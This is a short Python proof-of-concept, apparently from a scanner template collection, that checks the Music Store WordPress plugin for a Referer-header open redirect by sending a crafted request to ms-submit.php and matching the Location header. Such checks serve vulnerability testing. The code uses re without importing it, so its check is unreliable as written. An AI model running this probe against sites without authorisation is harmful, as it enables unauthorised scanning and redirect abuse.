import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Music Store <= 1.0.14 - Referer Header Open Redirect''',
        "description": '''The Music Store – WordPress eCommerce WordPress plugin was affected by a Referer Header Open Redirect security vulnerability.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/d73f6575-eb86-480c-bde1-f8765870cdd1", 
            "https://seclists.org/fulldisclosure/2015/Jul/113"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "redirect", "wp-plugin", "musicstore", "wp"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-content/plugins/music-store/ms-core/ms-submit.php"""
        method = "GET"
        data = """"""
        headers = {'Referer': 'https://example.com'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$""",str(resp0.headers))):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url